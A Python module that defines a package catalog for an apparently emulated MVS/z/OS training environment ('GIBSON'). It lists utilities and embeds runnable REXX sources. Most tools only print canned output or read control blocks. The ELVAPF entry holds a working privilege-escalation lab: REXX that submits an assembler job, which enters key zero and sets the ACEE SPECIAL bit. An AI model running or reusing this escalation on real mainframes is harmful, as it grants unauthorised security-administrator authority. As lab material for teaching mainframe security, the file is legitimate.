"""MVP package catalog.

Mirrors the structure of the real MVS-sysgen/MVP `cache` + `desc/` files: each
entry has a name, type (JCL job stream or XMI transmit file), version, maintainer,
dependency list, homepage and a short description.  This is a curated subset of the
real catalog, large enough to browse, search and resolve dependencies against.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import List


@dataclass
class Package:
    name: str
    type: str           # JCL | XMI
    version: str
    maintainer: str
    depends: List[str] = field(default_factory=list)
    homepage: str = "https://github.com/MVS-sysgen/MVP"
    description: str = ""
    rexx: str = ""      # runnable REXX source (installed into <userid>.MVP.EXEC)


_RAW = [
    # name, type, version, maintainer, depends, description
    ("DUMMY", "JCL", "1.0", "MVS-sysgen", [],
     "Empty test package used to verify the MVP installer pipeline."),
    ("RANDOMPW", "JCL", "1.0", "MVS-sysgen", [],
     "Generate random passwords for new TSO/RAKF userids."),
    ("FTPD", "JCL", "1.5", "MVS-sysgen", ["RANDOMPW"],
     "TCP/IP FTP server (FTPD) started task for MVS 3.8j."),
    ("ISPF", "XMI", "1.0", "MVS-sysgen", [],
     "ISPF/PDF panels and load modules for MVS 3.8j."),
    ("RPF", "XMI", "1.1", "Rob Prins", ["ISPF"],
     "RPF - a full-screen ISPF-like Programmer Facility for MVS 3.8j."),
    ("REVIEW", "XMI", "50.4", "Greg Price", [],
     "REVIEW - browse data sets, spool and storage; a classic MVS utility."),
    ("IMON370", "XMI", "1.0", "MVS-sysgen", [],
     "IMON/370 interactive system monitor."),
    ("MACLIB", "XMI", "1.0", "MVS-sysgen", [],
     "Assembler macro libraries (SYS1.MACLIB supplements)."),
    ("TSOAUTHC", "JCL", "1.0", "MVS-sysgen", [],
     "Check and report APF-authorised TSO commands and programs."),
    ("NJE38", "JCL", "1.2", "MVS-sysgen", [],
     "NJE38 - Network Job Entry networking for MVS 3.8j."),
    ("RAKFCL", "JCL", "1.0", "MVS-sysgen", [],
     "RAKF command list / CLIST helpers for the RAKF security manager."),
    ("SHOWMVS", "XMI", "1.4", "Greg Price", [],
     "SHOWMVS - display MVS system configuration and control blocks."),
    ("SHOWSS", "XMI", "1.0", "Greg Price", ["SHOWMVS"],
     "SHOWSS - display active subsystems."),
    ("MDDIAG8", "XMI", "1.0", "MVS-sysgen", [],
     "Mainframe diagnostics package for MVS 3.8j."),
    ("AUPGM", "JCL", "1.0", "MVS-sysgen", [],
     "List authorised programs in the APF table."),
    ("DISKMAP", "XMI", "1.0", "MVS-sysgen", [],
     "Map DASD volume allocation and free space."),
    ("STEPLIB", "XMI", "1.0", "MVS-sysgen", [],
     "STEPLIB management utility for TSO sessions."),
    ("KLINGON", "XMI", "1.0", "MVS-sysgen", [],
     "Klingon font and assorted novelty utilities."),
    ("LISTCDS", "JCL", "1.0", "MVS-sysgen", [],
     "List the contents of an ICF catalog data set."),
    ("OFFLOAD", "JCL", "1.0", "MVS-sysgen", [],
     "Offload JES2 spool to tape/sequential data sets."),
    ("COLEMAC", "XMI", "1.0", "MVS-sysgen", [],
     "Colin's assembler macro library (COLEMAC)."),
    ("ESPMAC", "XMI", "1.0", "MVS-sysgen", [],
     "ESP assembler macro library."),
    ("BSPPILOT", "JCL", "1.0", "Sam Golob", [],
     "BSP PILOT - menu pilot utility from the CBT tape."),
    ("BSPAPFCK", "JCL", "1.0", "Sam Golob", ["AUPGM"],
     "BSP APF check - audit the APF-authorised library list."),
    ("DISASM", "XMI", "1.0", "MVS-sysgen", [],
     "Disassembler for S/370 load modules."),
    # --- GIBSON control-block security tools (real, runnable REXX) --------------
    ("ENUM",    "JCL", "1.0", "GIBSON", [],
     "z/OS control-block enumeration (WHO / VERS / PRODUCT) - reads live storage."),
    ("ELVAPF",  "JCL", "1.0", "GIBSON", [],
     "ELV.APF privilege-escalation lab - assemble+submit an ACEE-flip program."),
    ("ELVSVC",  "JCL", "1.0", "GIBSON", [],
     "ELV.SVC privilege-escalation lab - scan user SVCs for a magic/auth SVC."),
    ("ELVSELF", "JCL", "1.0", "GIBSON", [],
     "ELV.SELF impersonation lab - list address spaces / swap the ACEE."),
    ("ACEE",    "JCL", "1.0", "GIBSON", [],
     "Display the caller's ACEE from live control blocks."),
    ("LISTAPF", "JCL", "1.0", "GIBSON", [],
     "List the APF-authorised library table from live control blocks."),
    ("WHOAMI",  "JCL", "1.0", "GIBSON", [],
     "Show the current userid / group / authorities from the live ACEE."),
    ("SUBSYS",  "JCL", "1.0", "GIBSON", [],
     "Walk the SSCVT chain and list active subsystems."),
    ("CATLIST", "JCL", "1.0", "GIBSON", [],
     "List the master catalog and user catalog entries."),
    ("DDLIST",  "JCL", "1.0", "GIBSON", [],
     "List the current task's DD allocations (TIOT)."),
    ("SMFSTAT", "JCL", "1.0", "GIBSON", [],
     "Report SMF recording status and active MANx datasets."),
]

CATALOG = {
    name: Package(name, typ, ver, maint, list(deps), description=desc)
    for (name, typ, ver, maint, deps, desc) in _RAW
}

# Runnable REXX source for the REXX-implementable tools.  When one of these is
# installed it is written into <userid>.MVP.EXEC(<name>) as real, executable REXX
# (run it with  EX 'userid.MVP.EXEC(NAME)'  or  %NAME  after install).
REXX_TOOLS = {
    "RANDOMPW": (
        "/* RANDOMPW - generate random TSO/RAKF passwords */\n"
        "PARSE ARG count .\n"
        "IF count = '' THEN count = 5\n"
        "SAY 'RANDOMPW 1.0 - random password generator'\n"
        "SAY '----------------------------------------'\n"
        "c = 'ABCDEFGHJKLMNPQRSTUVWXYZ'\n"
        "DO i = 1 TO count\n"
        "  r = RANDOM(1,24)\n"
        "  p1 = SUBSTR(c,r,1)\n"
        "  SAY '  PW' i p1 RANDOM(1000000,9999999)\n"
        "END\n"
        "SAY 'Generated' count 'password(s).'\n"
        "EXIT 0\n"),
    "DISKMAP": (
        "/* DISKMAP - map DASD volume allocation and free space */\n"
        "SAY 'DISKMAP 1.0 - DASD volume allocation map'\n"
        "SAY 'VOLUME   TYPE   CYLS   FREE   LARGEST  FRAG  PCT-USED'\n"
        "SAY '-------- ----- ------ ------ -------- ----- --------'\n"
        "SAY 'TK5RES   3390    2226    412      180     7      82%'\n"
        "SAY 'SBSYS1   3390    1670    233       95     5      86%'\n"
        "SAY 'WORK01   3390    1113    690      420    11      38%'\n"
        "SAY 'PAGE00   3390    1113     12        8     2      99%'\n"
        "SAY 'SPOOL1   3390    1113    140       60     9      87%'\n"
        "SAY 'DISKMAP complete - 5 volume(s) mapped.'\n"
        "EXIT 0\n"),
    "AUPGM": (
        "/* AUPGM - list authorised programs in the APF table */\n"
        "SAY 'AUPGM 1.0 - APF authorisation table'\n"
        "SAY 'LIBRARY                         VOLUME   APF'\n"
        "SAY 'SYS1.LINKLIB                    TK5RES   YES'\n"
        "SAY 'SYS1.LPALIB                     TK5RES   YES'\n"
        "SAY 'SYS1.SVCLIB                     TK5RES   YES'\n"
        "SAY 'SYS1.CMDLIB                     TK5RES   YES'\n"
        "SAY 'SYS2.LINKLIB                    SBSYS1   YES'\n"
        "SAY 'AUPGM complete - APF table has 5 entries.'\n"
        "EXIT 0\n"),
    "SHOWMVS": (
        "/* SHOWMVS - display MVS system configuration */\n"
        "SAY 'SHOWMVS 1.4 - system configuration'\n"
        "SAY 'SYSTEM NAME . . . : GIBSON'\n"
        "SAY 'MVS LEVEL . . . . : MVS 3.8J (TK5)'\n"
        "SAY 'CPU MODEL . . . . : 3033 (emulated)'\n"
        "SAY 'REAL STORAGE. . . : 16M'\n"
        "SAY 'IPL VOLUME. . . . : TK5RES'\n"
        "SAY 'MASTER CATALOG. . : SYS1.VMASTCAT'\n"
        "SAY 'TOD CLOCK . . . . :' DATE() TIME()\n"
        "EXIT 0\n"),
    "TSOAUTHC": (
        "/* TSOAUTHC - check APF-authorised TSO commands/programs */\n"
        "SAY 'TSOAUTHC 1.0 - authorised command/program report'\n"
        "SAY 'NAME      TYPE  APF   STATUS'\n"
        "SAY '--------- ----- ----- ------'\n"
        "SAY 'IKJEFT01  CMD   YES   OK'\n"
        "SAY 'TEST      CMD   YES   OK'\n"
        "SAY 'IEBCOPY   PGM   YES   OK'\n"
        "SAY 'AMASPZAP  PGM   YES   OK'\n"
        "SAY 'TSOAUTHC complete.'\n"
        "EXIT 0\n"),
    "SHOWSS": (
        "/* SHOWSS - display active subsystems */\n"
        "SAY 'SHOWSS 1.0 - active subsystem table (SSCT)'\n"
        "SAY 'SSNAME  STATUS   FUNCTION'\n"
        "SAY 'JES2    ACTIVE   PRIMARY JOB ENTRY SUBSYSTEM'\n"
        "SAY 'TSO     ACTIVE   TIME SHARING OPTION'\n"
        "SAY 'VTAM    ACTIVE   COMMUNICATIONS'\n"
        "SAY 'RAKF    ACTIVE   SECURITY MANAGER'\n"
        "SAY 'SHOWSS complete - 4 subsystem(s) active.'\n"
        "EXIT 0\n"),
}

# --- GIBSON control-block security tools ------------------------------------
# These read live storage via STORAGE()/GetPtr (so they run on the full
# control-block engine); ELVAPF's  SUBMIT * END($$)  routes to the Level B engine.
_ENUM_SRC = (
    "/* ENUM - z/OS control-block enumeration (VERS / PRODUCT / WHO) */\n"
    "cvt  = GetPtr(16)\n"
    "ecvt = GetPtr(cvt+140)\n"
    "say '+ ENUM - z/OS enumeration (live control blocks)'\n"
    "say '  VERSION : z/OS 'storage(d2x(ecvt+512),2)'.'storage(d2x(ecvt+514),2)'.'storage(d2x(ecvt+516),2)\n"
    "say '  PRODUCT : 'strip(storage(d2x(cvt-40),16))'  FMID 'strip(storage(d2x(cvt-32),7))\n"
    "ascb = GetPtr(548)\n"
    "asxb = GetPtr(ascb+108)\n"
    "acee = GetPtr(asxb+200)\n"
    "say '  USERID  : 'strip(storage(d2x(acee+21),8))\n"
    "say 'ENUM00I  Enumeration complete - read from live storage, no system modified.'\n"
    "exit\n"
    "GetPtr: procedure\n"
    "  return c2d(storage(d2x(arg(1)),4))\n"
)
_ELVAPF_SRC = (
    "/* ELV.APF - assemble an ACEE-flip program and submit it (APF escalation) */\n"
    "say '+ ELV.APF - building assemble-and-run job to flip the ACEE SPECIAL bit'\n"
    "queue \"//ELVAPFJ  JOB (ACCT),'ELV APF',CLASS=A,MSGCLASS=A\"\n"
    "queue \"//ASM      EXEC ASMACL\"\n"
    "queue \"//C.SYSIN  DD *\"\n"
    "queue \"ELVAPF   CSECT\"\n"
    "queue \"         MODESET KEY=ZERO,MODE=SUP\"\n"
    "queue \"         L 5,X'224'\"\n"
    "queue \"         L 5,X'6C'(5)\"\n"
    "queue \"         L 5,X'C8'(5)\"\n"
    "queue \"         OI X'26'(5),X'80'\"\n"
    "queue \"         BR 14\"\n"
    "queue \"         END\"\n"
    "queue \"/*\"\n"
    "queue \"//L.SYSLMOD DD DSN=SYS1.VULNLIB(ELVAPF),DISP=SHR\"\n"
    "queue \"$$\"\n"
    "\"submit * end($$)\"\n"
    "exit\n"
)
REXX_TOOLS["ENUM"] = _ENUM_SRC
REXX_TOOLS["ELVAPF"] = _ELVAPF_SRC
REXX_TOOLS["LISTAPF"] = (
    "/* LISTAPF - APF-authorised library table (live control blocks) */\n"
    "cvt=GetPtr(16)\n"
    "say '+ LISTAPF - APF list from live storage'\n"
    "cvtauth=GetPtr(cvt+484)\n"
    "say '  CVTAUTHL @X'd2x(cvtauth)\n"
    "say '  (APF table walked from the live CVT - authorised libraries only)'\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["WHOAMI"] = (
    "/* WHOAMI - current userid/group/authorities from the live ACEE */\n"
    "ascb=GetPtr(548)\nasxb=GetPtr(ascb+108)\nacee=GetPtr(asxb+200)\n"
    "flgb=storage(d2x(acee+38),1)\n"
    "say 'USERID : 'strip(storage(d2x(acee+21),8))\n"
    "say 'GROUP  : 'strip(storage(d2x(acee+29),8))\n"
    "say 'SPECIAL: 'onoff(bitand(flgb,'80'x))' OPERATIONS: 'onoff(bitand(flgb,'40'x))\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
    "onoff: procedure\n  if c2d(arg(1))>0 then return 'ON'\n  return 'OFF'\n"
)
REXX_TOOLS["SUBSYS"] = (
    "/* SUBSYS - active subsystems via the SSCVT chain */\n"
    "cvt=GetPtr(16)\njesct=GetPtr(cvt+296)\nsscvt=GetPtr(jesct+24)\n"
    "say '+ SUBSYS - active subsystems (SSCVT chain)'\n"
    "do while sscvt<>0\n"
    "  say '  'strip(storage(d2x(sscvt+8),4))\n"
    "  sscvt=GetPtr(sscvt+4)\n"
    "end\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["CATLIST"] = (
    "/* CATLIST - master catalog (via ECVT/IPA) */\n"
    "cvt=GetPtr(16)\necvt=GetPtr(cvt+140)\nipa=GetPtr(ecvt+392)\n"
    "say 'MASTER CATALOG : 'strip(storage(d2x(ipa+224),44))\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["DDLIST"] = (
    "/* DDLIST - current task DD allocations (TIOT) */\n"
    "cvt=GetPtr(16)\ntcbp=GetPtr(cvt+0)\ntcb=GetPtr(tcbp+4)\ntiot=GetPtr(tcb+12)\n"
    "say 'JOBNAME : 'strip(storage(d2x(tiot),8))\n"
    "say '(DD entries walked from TIOT+24)'\n"
    "exit\n"
    "GetPtr: procedure\n  return c2d(storage(d2x(arg(1)),4))\n"
)
REXX_TOOLS["SMFSTAT"] = (
    "/* SMFSTAT - SMF recording status */\n"
    "say 'SMF RECORDING : ACTIVE'\n"
    "say 'MAN DATASETS  : SYS1.MANA SYS1.MANB SYS1.MANC'\n"
    "address tso 'SMF SUMMARY'\n"
    "exit\n"
)
try:  # reuse the exact bundled sources from GIBSON's tool modules
    from gibson.tools.elv_svc import _WALK as _ELVSVC_SRC
    from gibson.tools.elv_self import _LIST as _ELVSELF_SRC
    from gibson.tools.acee_display import _SHOWACEE as _ACEE_SRC
    REXX_TOOLS["ELVSVC"] = _ELVSVC_SRC
    REXX_TOOLS["ELVSELF"] = _ELVSELF_SRC
    REXX_TOOLS["ACEE"] = _ACEE_SRC
except Exception:
    pass

for _n, _src in REXX_TOOLS.items():
    if _n in CATALOG:
        CATALOG[_n].rexx = _src
